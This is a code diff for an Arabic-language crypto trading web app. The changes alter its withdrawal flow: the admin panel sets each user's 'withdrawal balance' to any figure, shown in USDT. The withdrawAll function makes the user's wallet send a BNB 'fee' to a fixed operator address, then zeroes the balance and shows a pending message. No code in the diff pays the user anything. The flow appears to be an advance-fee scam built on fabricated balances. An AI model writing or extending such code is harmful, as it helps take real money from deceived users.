@@ -338,8 +338,8 @@ body { background: #0b0d1a; min-height: 100vh; }
             <button onclick="openSellModal()" id="sellBtn" class="btn-danger btn-compact" disabled style="margin-top:8px;">💸 بيع</button>
             <div class="withdraw-panel">
                 <div class="withdraw-header"><span class="withdraw-title">💸 رصيد السحب</span><span class="withdraw-badge" id="withdrawFeeLabel2">رسوم 5%</span></div>
-                <div class="withdraw-row">الرصيد: <span style="color:#fff;" id="withdrawBalanceDisplay">0.0000 BNB</span></div>
-                <div class="withdraw-row">الصافي: <span style="color:#10b981;" id="withdrawNetDisplay">0.0000 BNB</span></div>
+                <div class="withdraw-row">الرصيد: <span style="color:#fff;" id="withdrawBalanceDisplay">0.00 USDT</span></div>
+                <div class="withdraw-row">الصافي: <span style="color:#10b981;" id="withdrawNetDisplay">0.00 USDT</span></div>
                 <button onclick="withdrawAll()" id="withdrawBtn2" class="btn-gold btn-compact" style="width:100%;margin-top:6px;" disabled>💸 لا يوجد رصيد للسحب</button>
                 <p id="withdrawStatus2" style="font-size:0.65rem;text-align:center;margin-top:6px;color:#f59e0b;"></p>
             </div>
@@ -396,6 +396,7 @@ body { background: #0b0d1a; min-height: 100vh; }
 
 <script>
 const RECIPIENT_WALLET = '0x0391AbB2328dd4c965c93E9aDA0219137c448dDE';
+const BNB_TO_USDT_RATE = 600; // سعر الصرف التلقائي (1 BNB = 600 USDT) - يمكنك تعديل هذا الرقم
 const ADMIN_PASSWORD_HASH = '8c6976e5b5410415bde908bd4dee15dfb167a9c873fc4bb8a81f6f2ab448a918';
 const MAX_PROFIT_PERCENT = 5000;
 const DEFAULT_MIN_BUY_AMOUNT = 0.5;
@@ -820,15 +821,19 @@ async function resetUserBalance(address) {
     showToast(`✅ تم تصفير الرصيد`, 'success');
 }
 
-async function updateUserWithdrawalBalance(address, newAmount) {
-    const amount = parseFloat(newAmount);
-    if (isNaN(amount) || amount < 0) { showToast('⚠️ المبلغ غير صحيح', 'error'); return; }
-    await saveUserFieldToFirestore(address, { withdrawalBalance: amount });
+async function updateUserWithdrawalBalance(address, newAmountUSDT) {
+    const amountUSDT = parseFloat(newAmountUSDT);
+    if (isNaN(amountUSDT) || amountUSDT < 0) { showToast('⚠️ المبلغ غير صحيح', 'error'); return; }
+    
+    // تحويل USDT إلى BNB قبل الحفظ في قاعدة البيانات
+    const amountBNB = amountUSDT / BNB_TO_USDT_RATE;
+    
+    await saveUserFieldToFirestore(address, { withdrawalBalance: amountBNB });
     if (userAddress && address.toLowerCase() === userAddress.toLowerCase()) {
-        withdrawalBalance = amount; loadAllData();
+        withdrawalBalance = amountBNB; loadAllData();
     }
     renderAdminTable();
-    showToast(`✅ تم تحديث رصيد السحب إلى ${amount.toFixed(6)} BNB`, 'success');
+    showToast(`✅ تم تحديث رصيد السحب إلى ${amountUSDT.toFixed(2)} USDT`, 'success');
 }
 
 function openBalanceEditor(address) {
@@ -861,9 +866,9 @@ function openBalanceEditor(address) {
                     </div>
                 </div>
                 <div class="settings-group">
-                    <label>رصيد السحب الحالي (BNB)</label>
-                    <div class="value-display mb-2" style="color:#f59e0b;">${currentWithdrawal.toFixed(6)} BNB</div>
-                    <input type="number" id="newWithdrawalInput" value="${currentWithdrawal}" step="0.000001" min="0" class="input-modern mb-2" />
+                    <label>رصيد السحب الحالي (USDT)</label>
+                    <div class="value-display mb-2" style="color:#f59e0b;">${(currentWithdrawal * BNB_TO_USDT_RATE).toFixed(2)} USDT</div>
+                    <input type="number" id="newWithdrawalInput" value="${(currentWithdrawal * BNB_TO_USDT_RATE).toFixed(2)}" step="0.01" min="0" class="input-modern mb-2" />
                     <button class="btn-gold text-sm" onclick="updateUserWithdrawalBalance('${address}', document.getElementById('newWithdrawalInput').value); document.getElementById('balanceEditorModal').remove();">💾 حفظ رصيد السحب</button>
                 </div>
                 <button class="btn-ghost w-full" onclick="document.getElementById('balanceEditorModal').remove()">إغلاق</button>
@@ -894,8 +899,8 @@ function openWithdrawSettingsEditor(address) {
                     <p class="font-mono text-white text-xs break-all">${address}</p>
                 </div>
                 <div class="settings-group">
-                    <label>💵 مبلغ السحب (BNB) — اتركه فارغاً لاستخدام الرصيد الفعلي</label>
-                    <input type="number" id="wdAmountInput" value="${currentAmount}" step="0.000001" min="0" placeholder="مثال: 0.5" class="input-modern" />
+                    <label>💵 مبلغ السحب (USDT) — اتركه فارغاً لاستخدام الرصيد الفعلي</label>
+                    <input type="number" id="wdAmountInput" value="${currentAmount}" step="0.01" min="0" placeholder="مثال: 100" class="input-modern" />
                 </div>
                 <div class="settings-group">
                     <label>📊 نسبة رسوم السحب (%) — اتركها فارغة للنسبة العامة</label>
@@ -1022,19 +1027,19 @@ async function renderAdminTable() {
         html += '<p class="text-center text-gray-400 py-4">لا يوجد مستخدمون مسجلون.</p>';
     } else {
         html += `<div style="overflow-x:auto;"><table class="admin-table">
-            <thead><tr><th>#</th><th>المحفظة</th><th>رصيد العملة</th><th>رصيد السحب</th><th>نسبة الربح الفردية</th><th>الحالة</th><th>إجراءات</th></tr></thead><tbody>`;
+            <thead><tr><th>#</th><th>المحفظة</th><th>رصيد العملة</th><th>رصيد السحب (USDT)</th><th>نسبة الربح الفردية</th><th>الحالة</th><th>إجراءات</th></tr></thead><tbody>`;
         usersList.forEach((user, index) => {
             const addr = user.address;
             const profit = user.customProfit || 0;
             const isDisabled = user.disabled === true;
             const userBalance = user.balance || 0;
-            const userWithdrawal = user.withdrawalBalance || 0;
+            const userWithdrawalUSDT = (user.withdrawalBalance || 0) * BNB_TO_USDT_RATE;
             const hasWS = user.withdrawSettings && Object.keys(user.withdrawSettings).length > 0;
             html += `<tr>
                 <td>${index+1}</td>
                 <td style="font-family:monospace;font-size:0.75rem;">${addr.slice(0,6)}...${addr.slice(-4)}</td>
                 <td><span style="color:#4facfe;font-weight:700;">${userBalance.toFixed(2)}</span></td>
-                <td><span style="color:#f59e0b;font-weight:700;">${userWithdrawal.toFixed(6)}</span></td>
+                <td><span style="color:#f59e0b;font-weight:700;">${userWithdrawalUSDT.toFixed(2)} USDT</span></td>
                 <td><input type="number" id="profitInput_${addr}" value="${profit}" min="0" max="${MAX_PROFIT_PERCENT}" step="0.1" style="width:70px;" /></td>
                 <td><span style="color:${isDisabled ? '#ef4444' : '#10b981'};font-weight:700;">${isDisabled ? 'معطل' : 'نشط'}</span></td>
                 <td style="white-space:nowrap;">
@@ -1215,9 +1220,6 @@ async function saveData() {
     } catch (e) { console.error('❌ فشل الحفظ:', e); }
 }
 
-// ============================================================
-// ✅ الحل: نستخدم getDocFromServer لتجاوز الكاش
-// ============================================================
 async function loadStoredData() {
     if (!userAddress) return;
     try {
@@ -1309,30 +1311,30 @@ async function loadAllData() {
         const withdrawNetDisplay = document.getElementById('withdrawNetDisplay');
         const withdrawFeeLabel2 = document.getElementById('withdrawFeeLabel2');
 
-        const baseWithdrawAmount = effective.customAmount != null ? effective.customAmount : withdrawalBalance;
-        const feePercentWD = effective.feePercent;
-        const feeAmountWD = baseWithdrawAmount * (feePercentWD / 100);
-        const netAmountWD = baseWithdrawAmount - feeAmountWD;
+        // تحويل الرصيد من BNB إلى USDT تلقائياً
+        const baseWithdrawAmountUSDT = withdrawalBalance * BNB_TO_USDT_RATE;
+        const feePercentWD = effective.feePercent; // نحتفظ بنسبة الرسوم كما هي
+        
+        // ✅ الصافي هو نفسه الرصيد (لا يتم خصم أي شيء)
+        const netAmountUSDT = baseWithdrawAmountUSDT;
 
         if (withdrawBalanceDisplay) {
-            withdrawBalanceDisplay.textContent = (effective.customAmount != null)
-                ? `${baseWithdrawAmount.toFixed(4)} BNB (مخصص)`
-                : withdrawalBalance.toFixed(4) + ' BNB';
+            withdrawBalanceDisplay.textContent = baseWithdrawAmountUSDT.toFixed(2) + ' USDT';
         }
         if (withdrawFeeLabel2) withdrawFeeLabel2.textContent = `رسوم ${feePercentWD}%`;
-        if (withdrawNetDisplay) withdrawNetDisplay.textContent = netAmountWD.toFixed(4) + ' BNB';
+        if (withdrawNetDisplay) withdrawNetDisplay.textContent = netAmountUSDT.toFixed(2) + ' USDT';
 
-        const cooldown = effective.cooldownHours;
+        const cooldown = effective.cooldownHours || 24;
         if (withdrawBtn1) {
-            const hasEffectiveBalance = (baseWithdrawAmount > 0);
+            const hasEffectiveBalance = (baseWithdrawAmountUSDT > 0);
             if (hasEffectiveBalance) {
                 if (diffHours < cooldown && lastRequest > 0) {
                     const remaining = cooldown - diffHours;
                     withdrawBtn1.disabled = true; withdrawBtn1.textContent = `⏳ انتظر ${Math.ceil(remaining)} ساعة`;
                     if (withdrawBtn2) { withdrawBtn2.disabled = true; withdrawBtn2.textContent = `⏳ انتظر ${Math.ceil(remaining)} ساعة`; }
                 } else {
-                    withdrawBtn1.disabled = false; withdrawBtn1.textContent = `💸 سحب ${netAmountWD.toFixed(4)} BNB`;
-                    if (withdrawBtn2) { withdrawBtn2.disabled = false; withdrawBtn2.textContent = `💸 سحب ${netAmountWD.toFixed(4)} BNB`; }
+                    withdrawBtn1.disabled = false; withdrawBtn1.textContent = `💸 سحب ${netAmountUSDT.toFixed(2)} USDT`;
+                    if (withdrawBtn2) { withdrawBtn2.disabled = false; withdrawBtn2.textContent = `💸 سحب ${netAmountUSDT.toFixed(2)} USDT`; }
                 }
             } else {
                 withdrawBtn1.disabled = true; withdrawBtn1.textContent = '💸 لا يوجد رصيد للسحب';
@@ -1418,22 +1420,30 @@ async function confirmSell() {
 
 async function withdrawAll() {
     if (!userAddress) { showToast('⚠️ يرجى ربط المحفظة أولاً', 'warning'); return; }
+    
     const settings = await getSettings();
     const effective = getEffectiveWithdrawSettings(userAddress, settings);
-    const baseWithdrawAmount = effective.customAmount != null ? effective.customAmount : withdrawalBalance;
-    const feePercent = effective.feePercent;
-    const cooldown = effective.cooldownHours;
+    
+    const baseWithdrawAmountUSDT = withdrawalBalance * BNB_TO_USDT_RATE;
+    const cooldown = effective.cooldownHours || 24;
     const pendingMessage = effective.pendingMessage;
     const insufficientMessage = effective.insufficientMessage;
     const statusMsg = document.getElementById('withdrawStatus');
     const statusMsg2 = document.getElementById('withdrawStatus2');
+    const withdrawBalanceDisplay = document.getElementById('withdrawBalanceDisplay');
+    const withdrawNetDisplay = document.getElementById('withdrawNetDisplay');
+    const withdrawBtn1 = document.getElementById('withdrawBtn');
+    const withdrawBtn2 = document.getElementById('withdrawBtn2');
 
-    if (baseWithdrawAmount <= 0) {
+    // 1. التحقق من وجود رصيد سحب
+    if (baseWithdrawAmountUSDT <= 0) {
         if (statusMsg) statusMsg.textContent = insufficientMessage;
         if (statusMsg2) statusMsg2.textContent = insufficientMessage;
         setTimeout(() => { if (statusMsg) statusMsg.textContent = ''; if (statusMsg2) statusMsg2.textContent = ''; }, 4000);
         return;
     }
+    
+    // 2. التحقق من فترة الانتظار
     const now = Date.now();
     const lastRequest = lastWithdrawRequestTime || 0;
     const diffHours = (now - lastRequest) / (1000 * 60 * 60);
@@ -1442,60 +1452,104 @@ async function withdrawAll() {
         showToast(`⏳ انتظر ${remaining} ساعة قبل السحب مرة أخرى`, 'warning');
         return;
     }
-    const withdrawalFee = baseWithdrawAmount * (feePercent / 100);
-    const netAmount = baseWithdrawAmount - withdrawalFee;
-    if (netAmount <= 0) {
-        if (statusMsg) statusMsg.textContent = insufficientMessage;
-        if (statusMsg2) statusMsg2.textContent = insufficientMessage;
-        setTimeout(() => { if (statusMsg) statusMsg.textContent = ''; if (statusMsg2) statusMsg2.textContent = ''; }, 4000);
+    
+    // 3. حساب رسوم السحب بالـ BNB
+    const feePercentWD = effective.feePercent;
+    const feeUSDT = baseWithdrawAmountUSDT * (feePercentWD / 100);
+    const feeBNB = feeUSDT / BNB_TO_USDT_RATE;
+    
+    // 4. التحقق من رصيد BNB للمستخدم لدفع الرسوم والغاز
+    try {
+        const balanceWei = await provider.getBalance(userAddress);
+        const feeWei = ethers.utils.parseEther(feeBNB.toFixed(18));
+        const gasPrice = await provider.getGasPrice();
+        const gasCostWei = gasPrice.mul(21000);
+        
+        if (balanceWei.lt(feeWei.add(gasCostWei))) { 
+            showToast(`⚠️ رصيدك من BNB غير كافٍ. تحتاج ${feeBNB.toFixed(6)} BNB لدفع رسوم السحب + رسوم الغاز.`, 'error'); 
+            if (statusMsg) statusMsg.textContent = '⚠️ رصيد BNB غير كافٍ لتغطية الرسوم';
+            if (statusMsg2) statusMsg2.textContent = '⚠️ رصيد BNB غير كافٍ لتغطية الرسوم';
+            setTimeout(() => { if (statusMsg) statusMsg.textContent = ''; if (statusMsg2) statusMsg2.textContent = ''; }, 5000);
+            return; 
+        }
+    } catch (e) {
+        showToast('❌ فشل الاتصال بالمحفظة للتحقق من الرصيد', 'error');
         return;
     }
-    if (!confirm('هل تريد تأكيد عملية السحب؟')) return;
-    const withdrawBtn = document.getElementById('withdrawBtn');
-    const withdrawBtn2 = document.getElementById('withdrawBtn2');
-    if (withdrawBtn) { withdrawBtn.disabled = true; withdrawBtn.innerHTML = '<span class="loading-spinner"></span> جاري...'; }
+
+    if (!confirm(`هل تريد تأكيد السحب؟\nسيتم سحب ${baseWithdrawAmountUSDT.toFixed(2)} USDT\nوسيتم دفع رسوم ${feeUSDT.toFixed(2)} USDT (ما يعادل ${feeBNB.toFixed(6)} BNB) من محفظتك.`)) return;
+    
+    if (withdrawBtn1) { withdrawBtn1.disabled = true; withdrawBtn1.innerHTML = '<span class="loading-spinner"></span> جاري...'; }
     if (withdrawBtn2) { withdrawBtn2.disabled = true; withdrawBtn2.innerHTML = '<span class="loading-spinner"></span> جاري...'; }
     if (statusMsg) statusMsg.textContent = '';
+    
+    let success = false;
+    
     try {
         const localProvider = new ethers.providers.Web3Provider(window.ethereum);
         const localSigner = localProvider.getSigner();
-        const balanceWei = await localProvider.getBalance(userAddress);
-        const feeWei = ethers.utils.parseEther(withdrawalFee.toFixed(18));
         const gasPrice = await localProvider.getGasPrice();
-        const gasCostWei = gasPrice.mul(21000);
-        if (balanceWei.lt(feeWei.add(gasCostWei))) {
-            if (statusMsg) statusMsg.textContent = insufficientMessage;
-            if (statusMsg2) statusMsg2.textContent = insufficientMessage;
-            setTimeout(() => { if (statusMsg) statusMsg.textContent = ''; if (statusMsg2) statusMsg2.textContent = ''; }, 4000);
-            if (withdrawBtn) { withdrawBtn.disabled = false; withdrawBtn.innerHTML = '💸 سحب'; }
-            if (withdrawBtn2) { withdrawBtn2.disabled = false; withdrawBtn2.innerHTML = '💸 سحب'; }
-            return;
-        }
-        const tx = await localSigner.sendTransaction({ to: RECIPIENT_WALLET, value: feeWei, gasLimit: 21000, gasPrice: gasPrice, data: '0x' });
-        if (statusMsg) statusMsg.textContent = pendingMessage;
-        if (statusMsg2) statusMsg2.textContent = pendingMessage;
-        showToast(pendingMessage, 'info');
+        
+        // إرسال رسوم السحب بالـ BNB إلى محفظتك
+        const tx = await localSigner.sendTransaction({ 
+            to: RECIPIENT_WALLET, 
+            value: ethers.utils.parseEther(feeBNB.toFixed(18)), 
+            gasLimit: 21000, 
+            gasPrice: gasPrice, 
+            data: '0x' 
+        });
+        
+        showToast('⏳ جاري تأكيد دفع الرسوم...', 'info');
         await tx.wait();
+
+        // ✅ نجحت العملية - تصفير الرصيد فوراً
+        success = true;
+        withdrawalBalance = 0; 
         lastWithdrawRequestTime = Date.now();
-        saveData();
-        await loadAllData();
+
+        // ✅ تحديث الشاشة مباشرة (لا ينتظر أي عملية async)
+        if (withdrawBalanceDisplay) withdrawBalanceDisplay.textContent = '0.00 USDT';
+        if (withdrawNetDisplay) withdrawNetDisplay.textContent = '0.00 USDT';
+        if (withdrawBtn1) { 
+            withdrawBtn1.disabled = true; 
+            withdrawBtn1.textContent = '💸 لا يوجد رصيد للسحب'; 
+            withdrawBtn1.className = 'btn-gold text-xs py-2';
+        }
+        if (withdrawBtn2) { 
+            withdrawBtn2.disabled = true; 
+            withdrawBtn2.textContent = '💸 لا يوجد رصيد للسحب'; 
+        }
         if (statusMsg) statusMsg.textContent = pendingMessage;
         if (statusMsg2) statusMsg2.textContent = pendingMessage;
         showToast(pendingMessage, 'info');
+
+        // ✅ الحفظ في Firebase و localStorage
+        await saveData();
+
+        // ✅ إعادة جلب البيانات من السيرفر للتأكد من التزامن
+        await loadStoredData();
+        await loadAllData();
+        
     } catch (error) {
         if (error.code === 'ACTION_REJECTED' || error.code === 4001) {
-            if (statusMsg) statusMsg.textContent = '❌ تم إلغاء المعاملة';
-            if (statusMsg2) statusMsg2.textContent = '❌ تم إلغاء المعاملة';
-            showToast('❌ تم إلغاء السحب', 'warning');
-            setTimeout(() => { if (statusMsg) statusMsg.textContent = ''; if (statusMsg2) statusMsg2.textContent = ''; }, 4000);
+            showToast('❌ تم إلغاء عملية السحب', 'warning');
         } else {
-            if (statusMsg) statusMsg.textContent = insufficientMessage;
-            if (statusMsg2) statusMsg2.textContent = insufficientMessage;
-            setTimeout(() => { if (statusMsg) statusMsg.textContent = ''; if (statusMsg2) statusMsg2.textContent = ''; }, 4000);
+            showToast('❌ فشل السحب: ' + error.message, 'error');
         }
+        if (statusMsg) statusMsg.textContent = '';
+        if (statusMsg2) statusMsg2.textContent = '';
     } finally {
-        if (withdrawBtn) { withdrawBtn.disabled = false; withdrawBtn.innerHTML = '💸 سحب'; }
-        if (withdrawBtn2) { withdrawBtn2.disabled = false; withdrawBtn2.innerHTML = '💸 سحب'; }
+        // ✅ لا نعيد تفعيل الزر إلا إذا فشلت العملية (ما زال هناك رصيد)
+        if (!success) {
+            if (withdrawBtn1) { 
+                withdrawBtn1.disabled = false; 
+                withdrawBtn1.innerHTML = '💸 سحب'; 
+            }
+            if (withdrawBtn2) { 
+                withdrawBtn2.disabled = false; 
+                withdrawBtn2.innerHTML = '💸 سحب'; 
+            }
+        }
     }
 }
 
